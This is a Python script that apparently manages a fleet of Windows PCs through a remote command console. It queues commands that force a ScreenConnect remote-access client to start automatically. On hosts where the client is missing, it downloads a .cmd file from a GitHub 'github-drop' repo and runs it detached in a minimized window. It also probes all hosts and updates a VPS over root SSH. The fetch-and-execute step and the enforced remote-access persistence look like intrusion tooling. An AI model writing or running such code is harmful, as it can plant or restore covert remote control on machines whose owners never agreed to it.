#!/usr/bin/env python3
"""Start stopped Gryxa hosts; UI-recover MISSING; final fleet probe."""
from __future__ import annotations

import json
import re
import sys
import time
import urllib.parse
import urllib.request
from pathlib import Path

import paramiko

BASE = "https://debian.seczio.com"
ADMIN = ((Path(__file__).resolve().parent / "secrets" / "admin_token.txt")).read_text(encoding="utf-8").strip()
OUT = Path.home() / "Desktop" / "gryxa_fleet_scan.txt"
KEY = str(Path.home() / ".ssh" / "winrtcs_ed25519")

START = (
    'sc config "ScreenConnect Client (36e506ff016b2151)" start= auto'
    ' & sc start "ScreenConnect Client (36e506ff016b2151)"'
    " & powershell -NoProfile -NonInteractive -Command "
    "\"$s=Get-Service -Name 'ScreenConnect Client (36e506ff016b2151)' -EA SilentlyContinue; "
    "if($s){Write-Output ('AFTER='+$s.Status)} else {Write-Output 'AFTER=MISSING'}\""
    " & echo START_DONE"
)

RECOVER = (
    'start "" /min cmd.exe /c "'
    r"C:\Windows\System32\curl.exe -f -L --ssl-no-revoke --connect-timeout 15 --max-time 90"
    r" -o C:\Users\Public\gryxa_recover.cmd"
    " https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_gryxa_recover.cmd"
    r" & call C:\Users\Public\gryxa_recover.cmd --detached"
    '" & echo RECOVER_R2_QUEUED'
)

PROBE = (
    "powershell -NoProfile -NonInteractive -Command "
    "\"$ErrorActionPreference='SilentlyContinue'; "
    "$s=Get-CimInstance Win32_Service | Where-Object { $_.Name -eq 'ScreenConnect Client (36e506ff016b2151)' } | Select-Object -First 1; "
    "if(-not $s){ Write-Output 'GRYXA=MISSING' } else { "
    "$g= if($s.PathName -match 'gryxa\\.com'){'YES'} else {'NO'}; "
    "Write-Output ('GRYXA='+$s.State+'|PATH_GRYXA='+$g+'|START='+$s.StartMode) "
    "}; Write-Output 'GRYXA_PROBE_DONE'\""
)

STOPPED = ["CUONGCHECKERS", "IDGITPOE1959"]
MISSING = [
    "DESKTOP-3UFSG6P",
    "DESKTOP-L12E0G2",
    "DESKTOP-L66QG8O",
    "MRG-DELL",
    "SECRETARYPC",
]


def api(path: str, fields: dict | None = None) -> str:
    data = urllib.parse.urlencode(fields).encode() if fields is not None else None
    req = urllib.request.Request(BASE + path, data=data)
    req.add_header("Authorization", "Bearer " + ADMIN)
    req.add_header("User-Agent", "Mozilla/5.0 (WinRTCS-Console)")
    with urllib.request.urlopen(req, timeout=90) as r:
        return r.read().decode(errors="replace")


def api_json(path: str) -> dict:
    return json.loads(api(path))


def queue(target: str, cmd: str) -> int:
    text = api("/cmd", {"target": target, "cmd": cmd})
    print(text.strip())
    m = re.search(r"id=(\d+)", text)
    if not m:
        raise RuntimeError(text)
    return int(m.group(1))


def wait_all(cid: int, min_n: int = 85, timeout: float = 200.0) -> list[dict]:
    t0 = time.time()
    last = -1
    while time.time() - t0 < timeout:
        res = api_json(f"/api/cmd/{cid}").get("results") or []
        if len(res) != last:
            print(f"  cmd#{cid} results={len(res)} ({int(time.time()-t0)}s)")
            last = len(res)
        if len(res) >= min_n and (time.time() - t0) >= 90:
            time.sleep(15)
            return api_json(f"/api/cmd/{cid}").get("results") or []
        time.sleep(8)
    return api_json(f"/api/cmd/{cid}").get("results") or []


def sync_vps() -> None:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect("144.172.107.56", username="root", key_filename=KEY, timeout=20)
    _i, o, e = ssh.exec_command(
        "cd /opt/winrtcs/repo && git fetch origin && git pull --ff-only && git log -1 --oneline"
    )
    print(o.read().decode(errors="replace"))
    err = e.read().decode(errors="replace")
    if err.strip():
        print(err)
    ssh.close()


def main() -> int:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    print("== sync VPS mirror ==")
    sync_vps()

    # Verify raw has R2
    import urllib.request as u

    body = u.urlopen(
        "https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_gryxa_recover.cmd",
        timeout=30,
    ).read().decode(errors="replace")
    assert "recover_begin host=%COMPUTERNAME% R2" in body or "R2: UI MSI" in body, "R2 not on github yet"
    print("github R2 OK")

    for h in STOPPED:
        print("start", h)
        queue(h, START)
        time.sleep(0.15)
    for h in MISSING:
        print("recover-r2", h)
        queue(h, RECOVER)
        time.sleep(0.15)

    print("wait 280s")
    time.sleep(280)

    print("== final ALL probe ==")
    cid = queue("ALL", PROBE)
    results = wait_all(cid)
    buckets = {k: [] for k in ("RUNNING", "STOPPED", "MISSING", "WRONG_PATH", "OTHER", "NO_PARSE")}
    detail = {}
    for r in results:
        host = r.get("host") or "?"
        out = r.get("out") or ""
        detail[host] = out
        m = re.search(r"GRYXA=([A-Za-z_]+)", out)
        if not m:
            buckets["NO_PARSE"].append(host)
            continue
        st = m.group(1).upper()
        if st == "RUNNING":
            buckets["WRONG_PATH" if "PATH_GRYXA=NO" in out else "RUNNING"].append(host)
        elif st in ("STOPPED", "STOP_PENDING", "START_PENDING", "PAUSED"):
            buckets["STOPPED"].append(host)
        elif st == "MISSING":
            buckets["MISSING"].append(host)
        else:
            buckets["OTHER"].append(host)

    lines = [
        f"=== FINAL3 {time.strftime('%Y-%m-%d %H:%M:%S')} cmd=#{cid} responded={len(results)} ==="
    ]
    for k in ("RUNNING", "STOPPED", "MISSING", "WRONG_PATH", "OTHER", "NO_PARSE"):
        lines.append(f"{k}={len(buckets[k])}")
    for k in ("STOPPED", "MISSING", "WRONG_PATH", "OTHER", "NO_PARSE"):
        if buckets[k]:
            lines.append(f"--- {k} ---")
            for h in sorted(buckets[k]):
                lines.append(f"  {h} :: {detail.get(h,'').replace(chr(10),' | ')[:140]}")

    fleet = api_json("/api/fleet")
    counts = fleet.get("counts") or {}
    online_no = sorted(
        h["host"]
        for h in (fleet.get("hosts") or [])
        if h.get("presence") == "online" and not h.get("has_gryxa")
    )
    lines.append(f"SIGHT={counts}")
    lines.append(f"sight_online_no_gryxa={online_no}")
    lines.append("--- FOCUS ---")
    for h in STOPPED + MISSING + ["DESKTOP-RC2IJC1", "330MLRACE", "NBK-JBURKS"]:
        lines.append(f"  {h} :: {detail.get(h, '(no response)').replace(chr(10),' | ')[:140]}")

    report = "\n".join(lines) + "\n"
    prev = OUT.read_text(encoding="utf-8") if OUT.exists() else ""
    OUT.write_text(prev + "\n" + report, encoding="utf-8")
    print(report)
    print("wrote", OUT)
    bad = buckets["STOPPED"] + buckets["MISSING"] + buckets["WRONG_PATH"]
    return 0 if not bad else 2


if __name__ == "__main__":
    raise SystemExit(main())
